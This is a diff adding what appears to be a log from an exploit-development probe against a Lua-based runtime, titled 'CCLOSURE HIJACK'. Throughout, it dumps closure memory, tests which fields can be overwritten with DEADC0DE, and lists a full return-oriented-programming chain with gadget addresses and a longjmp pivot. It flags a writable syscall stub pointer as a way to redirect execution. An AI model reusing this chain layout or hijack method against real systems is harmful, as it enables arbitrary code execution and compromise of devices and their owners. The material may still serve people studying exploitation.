@@ -1,0 +1,263 @@
+=== PROBE 47b: CCLOSURE HIJACK ===
+
+pid: 149
+modules loaded: 8
+
+=== A: CCLOSURE STRUCT ANALYSIS ===
+__call raw string: [function: 3105afaa0]
+CClosure object address: 0x3105afaa0
+
+CClosure memory dump:
+  +00: 00000003_105AF820 → mod0.text+0xFFFFFFFF91137820 *** C FUNCTION CANDIDATE ***
+  +08: 00000000_00000106
+  +16: 00000003_105AF820 → mod0.text+0xFFFFFFFF91137820
+  +24: 00000003_104CE000 → mod0.text+0xFFFFFFFF91056000
+  +32: 00000003_10549160 → mod0.text+0xFFFFFFFF910D1160
+  +40: F8AFAFAF_AFAFAFAF → mod2.data+0xAFAFAFAB
+  +48: 00000001_83D58EE0 → mod0.text+0x48E0EE0
+  +56: 00000000_00000047
+  +64: 00000003_105AFAA0 → mod0.text+0xFFFFFFFF91137AA0
+  +72: 00000000_00000106
+  +80: 00000003_105AFAA0 → mod0.text+0xFFFFFFFF91137AA0
+  +88: 00000003_104CE000 → mod0.text+0xFFFFFFFF91056000
+  +96: 00000003_105AD480 → mod0.text+0xFFFFFFFF91135480
+
+BEST C function candidate: offset +0 → 00000003_105AF820 (mod0.text+0xFFFFFFFF91137820)
+
+=== WRITE TEST ===
+  +24: WRITABLE (was 00000003_104CE000, wrote DEADC0DE, read DEADC0DE_DEADC0DE) *** WRITABLE ***
+  +32: WRITABLE (was 00000003_10549160, wrote DEADC0DE, read DEADC0DE_DEADC0DE) *** WRITABLE ***
+  +40: WRITABLE (was F8AFAFAF_AFAFAFAF, wrote DEADC0DE, read DEADC0DE_DEADC0DE) *** WRITABLE ***
+  +48: WRITABLE (was 00000001_83D58EE0, wrote DEADC0DE, read DEADC0DE_DEADC0DE) *** WRITABLE ***
+  +16: WRITABLE (was 00000003_105AF820, wrote DEADC0DE, read DEADC0DE_DEADC0DE) *** WRITABLE ***
+
+*** 5 WRITABLE OFFSET(S) FOUND IN CCLOSURE! ***
+
+=== B: C FUNCTION CODE BYTES ===
+Reading code at 00000003_105AF820 (mod0.text+0xFFFFFFFF91137820):
+  +000: 40 f9 5a 10 03 00 00 00 06 01 00 00 01 00 00 00 
+  +010: 40 f9 5a 10 03 00 00 00 00 e0 4c 10 03 00 00 00 
+  +020: c0 90 53 10 03 00 00 00 af af af af af af af f8 
+  +030: e0 8e d5 83 01 00 00 00 67 00 00 00 00 00 00 00 
+  +040: c0 f7 5a 10 03 00 00 00 05 01 0b 00 00 00 00 00 
+  +050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+  +060: c0 f8 5a 10 03 00 00 00 e8 f8 5a 10 03 00 00 00 
+
+=== C: CHAIN/JMPBUF TARGETS ===
+pipe: address @ 0x82151cb57
+
+ropchain @ 0x31068a0f0 (size: 0x2f0)
+
+fcall_stub.fn_addr: 0x310689fd0
+fcall_stub.return_addr: 0x310689fe0
+
+0x31068a0f0: 0x7f478042	; ret
+0x31068a0f8: 0x7f478992	; pop rax; ret
+0x31068a100: 0x310688040
+0x31068a108: 0x7f496ebb	; mov rax, [rax]; ret
+0x31068a110: 0x7f541dfe	; pop rdi; ret
+0x31068a118: 0x310689fd0
+0x31068a120: 0x7f50ac67	; mov [rdi], rax; ret
+0x31068a128: 0x7f478992	; pop rax; ret
+0x31068a130: 0x31068a348
+0x31068a138: 0x7f541dfe	; pop rdi; ret
+0x31068a140: 0x310689fe0
+0x31068a148: 0x7f50ac67	; mov [rdi], rax; ret
+0x31068a150: 0x7f478992	; pop rax; ret
+0x31068a158: 0x3106880b0
+0x31068a160: 0x7f496ebb	; mov rax, [rax]; ret
+0x31068a168: 0x7f541dfe	; pop rdi; ret
+0x31068a170: 0x31068a198
+0x31068a178: 0x7f50ac67	; mov [rdi], rax; ret
+0x31068a180: 0x7f478992	; pop rax; ret
+0x31068a188: 0x31068c100
+0x31068a190: 0x7f5b9fc7	; pop r13; pop r14; pop r15; ret
+0x31068a198: 0x0
+0x31068a1a0: 0x7f478042	; ret
+0x31068a1a8: 0x7f478042	; ret
+0x31068a1b0: 0x7f5ae970	; mov r9, r13; call [rax + 8]
+0x31068a1b8: 0x7f478992	; pop rax; ret
+0x31068a1c0: 0x7f5ae970	; mov r9, r13; call [rax + 8]
+0x31068a1c8: 0x7f541dfe	; pop rdi; ret
+0x31068a1d0: 0x31068a1b0
+0x31068a1d8: 0x7f50ac67	; mov [rdi], rax; ret
+0x31068a1e0: 0x7f478992	; pop rax; ret
+0x31068a1e8: 0x3106880a0
+0x31068a1f0: 0x7f496ebb	; mov rax, [rax]; ret
+0x31068a1f8: 0x7f541dfe	; pop rdi; ret
+0x31068a200: 0x31068a218
+0x31068a208: 0x7f50ac67	; mov [rdi], rax; ret
+0x31068a210: 0x7f478991	; pop r8; ret
+0x31068a218: 0x0
+0x31068a220: 0x7f478992	; pop rax; ret
+0x31068a228: 0x310688090
+0x31068a230: 0x7f496ebb	; mov rax, [rax]; ret
+0x31068a238: 0x7f541dfe	; pop rdi; ret
+0x31068a240: 0x31068a258
+0x31068a248: 0x7f50ac67	; mov [rdi], rax; ret
+0x31068a250: 0x7f478e64	; pop rcx; ret
+0x31068a258: 0x0
+0x31068a260: 0x7f478992	; pop rax; ret
+0x31068a268: 0x310688080
+0x31068a270: 0x7f496ebb	; mov rax, [rax]; ret
+0x31068a278: 0x7f541dfe	; pop rdi; ret
+0x31068a280: 0x31068a298
+0x31068a288: 0x7f50ac67	; mov [rdi], rax; ret
+0x31068a290: 0x7f8282d7	; pop rdx; ret
+0x31068a298: 0x0
+0x31068a2a0: 0x7f478992	; pop rax; ret
+0x31068a2a8: 0x310688070
+0x31068a2b0: 0x7f496ebb	; mov rax, [rax]; ret
+0x31068a2b8: 0x7f541dfe	; pop rdi; ret
+0x31068a2c0: 0x31068a2d8
+0x31068a2c8: 0x7f50ac67	; mov [rdi], rax; ret
+0x31068a2d0: 0x7f48577d	; pop rsi; ret
+0x31068a2d8: 0x0
+0x31068a2e0: 0x7f478992	; pop rax; ret
+0x31068a2e8: 0x310688060
+0x31068a2f0: 0x7f496ebb	; mov rax, [rax]; ret
+0x31068a2f8: 0x7f541dfe	; pop rdi; ret
+0x31068a300: 0x31068a318
+0x31068a308: 0x7f50ac67	; mov [rdi], rax; ret
+0x31068a310: 0x7f541dfe	; pop rdi; ret
+0x31068a318: 0x31068e500
+0x31068a320: 0x7f478992	; pop rax; ret
+0x31068a328: 0x310688050
+0x31068a330: 0x7f496ebb	; mov rax, [rax]; ret
+0x31068a338: 0x7f4789a2	; pop rsp; ret
+0x31068a340: 0x310689fd0
+0x31068a348: 0x7f541dfe	; pop rdi; ret
+0x31068a350: 0x31068c120
+0x31068a358: 0x7f50ac67	; mov [rdi], rax; ret
+0x31068a360: 0x7f478992	; pop rax; ret
+0x31068a368: 0x1db870070	; longjmp
+0x31068a370: 0x7f541dfe	; pop rdi; ret
+0x31068a378: 0x310689fd0
+0x31068a380: 0x7f50ac67	; mov [rdi], rax; ret
+0x31068a388: 0x7f478992	; pop rax; ret
+0x31068a390: 0x31068a3e0
+0x31068a398: 0x7f541dfe	; pop rdi; ret
+0x31068a3a0: 0x310689fe0
+0x31068a3a8: 0x7f50ac67	; mov [rdi], rax; ret
+0x31068a3b0: 0x7f541dfe	; pop rdi; ret
+0x31068a3b8: 0x31068c130
+0x31068a3c0: 0x7f48577d	; pop rsi; ret
+0x31068a3c8: 0x0
+0x31068a3d0: 0x7f4789a2	; pop rsp; ret
+0x31068a3d8: 0x310689fd0
+ropchain: 0x31068a0f0
+fn_addr:  0x310689fd0
+
+ROP chain region dump:
+  chain-024: 00000000_7F4D36E8 → mod0.text+0x5B6E8
+  chain+000: 00000000_7F478042 → mod0.text+0x42
+  chain+008: 00000000_7F478992 → mod0.text+0x992
+  chain+016: 00000003_10688040 → mod0.text+0xFFFFFFFF91210040
+  chain+024: 00000000_7F496EBB → mod0.text+0x1EEBB
+  chain+032: 00000000_7F541DFE → mod0.text+0xC9DFE
+  chain+040: 00000003_10689FD0 → mod0.text+0xFFFFFFFF91211FD0
+  chain+048: 00000000_7F50AC67 → mod0.text+0x92C67
+  chain+056: 00000000_7F478992 → mod0.text+0x992
+  chain+064: 00000003_1068A348 → mod0.text+0xFFFFFFFF91212348
+  chain+072: 00000000_7F541DFE → mod0.text+0xC9DFE
+  chain+080: 00000003_10689FE0 → mod0.text+0xFFFFFFFF91211FE0
+  chain+088: 00000000_7F50AC67 → mod0.text+0x92C67
+  chain+096: 00000000_7F478992 → mod0.text+0x992
+  chain+104: 00000003_106880B0 → mod0.text+0xFFFFFFFF912100B0
+  chain+112: 00000000_7F496EBB → mod0.text+0x1EEBB
+  chain+120: 00000000_7F541DFE → mod0.text+0xC9DFE
+  chain+128: 00000003_1068A198 → mod0.text+0xFFFFFFFF91212198
+  chain+136: 00000000_7F50AC67 → mod0.text+0x92C67
+  chain+144: 00000000_7F478992 → mod0.text+0x992
+  chain+152: 00000003_1068C100 → mod0.text+0xFFFFFFFF91214100
+  chain+160: 00000000_7F5B9FC7 → mod0.text+0x141FC7
+  chain+176: 00000000_7F478042 → mod0.text+0x42
+  chain+184: 00000000_7F478042 → mod0.text+0x42
+  chain+192: 00000000_7F5AE970 → mod0.text+0x136970
+  chain+200: 00000000_7F478992 → mod0.text+0x992
+  chain+208: 00000000_7F5AE970 → mod0.text+0x136970
+  chain+216: 00000000_7F541DFE → mod0.text+0xC9DFE
+  chain+224: 00000003_1068A1B0 → mod0.text+0xFFFFFFFF912121B0
+  chain+232: 00000000_7F50AC67 → mod0.text+0x92C67
+  chain+240: 00000000_7F478992 → mod0.text+0x992
+  chain+248: 00000003_106880A0 → mod0.text+0xFFFFFFFF912100A0
+  chain+256: 00000000_7F496EBB → mod0.text+0x1EEBB
+
+Chain region write test (code pointers only):
+  chain-024: 00000000_7F4D36E8 → mod0.text+0x5B6E8 — *** WRITABLE ***
+  chain+000: 00000000_7F478042 → mod0.text+0x42 — *** WRITABLE ***
+  chain+008: 00000000_7F478992 → mod0.text+0x992 — *** WRITABLE ***
+  chain+016: 00000003_10688040 → mod0.text+0xFFFFFFFF91210040 — *** WRITABLE ***
+  chain+024: 00000000_7F496EBB → mod0.text+0x1EEBB — *** WRITABLE ***
+  chain+032: 00000000_7F541DFE → mod0.text+0xC9DFE — *** WRITABLE ***
+  chain+040: 00000003_10689FD0 → mod0.text+0xFFFFFFFF91211FD0 — *** WRITABLE ***
+  chain+048: 00000000_7F50AC67 → mod0.text+0x92C67 — *** WRITABLE ***
+  chain+056: 00000000_7F478992 → mod0.text+0x992 — *** WRITABLE ***
+  chain+064: 00000003_1068A348 → mod0.text+0xFFFFFFFF91212348 — *** WRITABLE ***
+  chain+072: 00000000_7F541DFE → mod0.text+0xC9DFE — *** WRITABLE ***
+  chain+080: 00000003_10689FE0 → mod0.text+0xFFFFFFFF91211FE0 — *** WRITABLE ***
+  chain+088: 00000000_7F50AC67 → mod0.text+0x92C67 — *** WRITABLE ***
+  chain+096: 00000000_7F478992 → mod0.text+0x992 — *** WRITABLE ***
+  chain+104: 00000003_106880B0 → mod0.text+0xFFFFFFFF912100B0 — *** WRITABLE ***
+  chain+112: 00000000_7F496EBB → mod0.text+0x1EEBB — *** WRITABLE ***
+  chain+120: 00000000_7F541DFE → mod0.text+0xC9DFE — *** WRITABLE ***
+  chain+128: 00000003_1068A198 → mod0.text+0xFFFFFFFF91212198 — *** WRITABLE ***
+  chain+136: 00000000_7F50AC67 → mod0.text+0x92C67 — *** WRITABLE ***
+  chain+144: 00000000_7F478992 → mod0.text+0x992 — *** WRITABLE ***
+  chain+152: 00000003_1068C100 → mod0.text+0xFFFFFFFF91214100 — *** WRITABLE ***
+  chain+160: 00000000_7F5B9FC7 → mod0.text+0x141FC7 — *** WRITABLE ***
+  chain+176: 00000000_7F478042 → mod0.text+0x42 — *** WRITABLE ***
+  chain+184: 00000000_7F478042 → mod0.text+0x42 — *** WRITABLE ***
+  chain+192: 00000000_7F5AE970 → mod0.text+0x136970 — *** WRITABLE ***
+  chain+200: 00000000_7F478992 → mod0.text+0x992 — *** WRITABLE ***
+  chain+208: 00000000_7F5AE970 → mod0.text+0x136970 — *** WRITABLE ***
+  chain+216: 00000000_7F541DFE → mod0.text+0xC9DFE — *** WRITABLE ***
+  chain+224: 00000003_1068A1B0 → mod0.text+0xFFFFFFFF912121B0 — *** WRITABLE ***
+  chain+232: 00000000_7F50AC67 → mod0.text+0x92C67 — *** WRITABLE ***
+  chain+240: 00000000_7F478992 → mod0.text+0x992 — *** WRITABLE ***
+  chain+248: 00000003_106880A0 → mod0.text+0xFFFFFFFF912100A0 — *** WRITABLE ***
+  chain+256: 00000000_7F496EBB → mod0.text+0x1EEBB — *** WRITABLE ***
+
+fn_addr region dump:
+  fn-024: 00000001_DB870090 → mod0.text+0x5C3F8090
+  fn-016: 00000000_7F478042 → mod0.text+0x42
+  fn+000: 00009FE5_1068C130
+  fn+008: 00000000_7F4789A2 → mod0.text+0x9A2
+  fn+016: 00000003_1068A3E0 → mod0.text+0xFFFFFFFF912123E0
+  fn_addr value writable: true (was 00009FE5_1068C130, read DEADC0DE_DEADC0DE)
+  *** fn_addr IS WRITABLE — can redirect syscall stub target ***
+
+=== D: METATABLE FUNCTION POINTER SCAN ===
+  mt.__call                    obj=0x3105afaa0 +32=00000003_10549160 WRITABLE *** WRITABLE ***
+  mt.__tostring                obj=0x3105afae0 +32=00000003_105AD480 WRITABLE *** WRITABLE ***
+  mt.create_initial_chain      obj=0x3105af820 +32=00000003_105390C0 WRITABLE *** WRITABLE ***
+  mt.new                       obj=0x3105af940 +32=00000003_10538020 WRITABLE *** WRITABLE ***
+
+=== E: ARG_ADDR / SLOT SCAN ===
+mt.arg_addr type: table
+
+=== F: REDIRECT TEST ===
+CClosure function pointer is NOT writable (or offset unknown)
+Checking if fn_addr redirect would work instead...
+fn_addr current value: 00009FE5_1068C130
+Testing fn_addr writability...
+fn_addr IS writable (but make_syscall doesn't use it)
+Testing if original syscall.pipe.__call reads fn_addr...
+(skipping live redirect test on syscall.pipe — too risky)
+
+=== G: SUMMARY ===
+CClosure address: 0x3105afaa0
+C func ptr offset: +0
+C func ptr value: 00000003_105AF820
+C func ptr writable: false
+fn_addr: 0x310689fd0
+Modules found: 8
+
+*** WRITABLE OFFSETS IN CCLOSURE: ***
+  +24
+  +32
+  +40
+  +48
+  +16
+
+=== PROBE 47b COMPLETE ===
